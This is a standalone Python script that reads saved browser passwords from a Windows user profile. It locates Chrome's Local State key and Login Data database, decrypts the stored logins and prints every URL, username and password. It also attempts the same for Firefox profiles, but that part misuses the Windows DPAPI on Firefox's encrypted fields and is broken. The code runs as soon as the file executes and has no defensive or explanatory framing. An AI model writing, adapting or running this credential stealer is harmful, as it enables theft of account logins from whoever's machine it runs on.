import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil


def get_chrome_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
                                    "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except Exception as e:
            return ""


def get_chrome_passwords():
    key = get_chrome_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default",
                           "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)

        if username and decrypted_password:
            print("--------------------------------------------------------------------")
            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

    cursor.close()
    db.close()
    os.remove(filename)


def get_firefox_passwords():
    import subprocess

    def get_firefox_profile_path():
        profiles_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        profile_folders = os.listdir(profiles_path)
        for folder in profile_folders:
            if folder.endswith(".default-release"):
                return os.path.join(profiles_path, folder)

    def decrypt_firefox_password():
        profile_path = get_firefox_profile_path()
        logins_path = os.path.join(profile_path, "logins.json")
        key4_path = os.path.join(profile_path, "key4.db")
        if not os.path.exists(logins_path) or not os.path.exists(key4_path):
            return []

        command = ['firefox', '-P', profile_path, '-no-remote', '-headless', '-print']

        subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        with open(logins_path, "r") as logins_file:
            logins_data = json.load(logins_file)

        passwords = []

        for login in logins_data["logins"]:
            encrypted_username = base64.b64decode(login["encryptedUsername"])
            encrypted_password = base64.b64decode(login["encryptedPassword"])
            decrypted_username = win32crypt.CryptUnprotectData(encrypted_username, None, None, None, 0)[1].decode()
            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()

            if decrypted_username and decrypted_password:
                passwords.append({
                    "url": login["hostname"],
                    "username": decrypted_username,
                    "password": decrypted_password
                })

        return passwords

    passwords = decrypt_firefox_password()

    for entry in passwords:
        print("--------------------------------------------------------------------")
        print(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")


get_chrome_passwords()
get_firefox_passwords()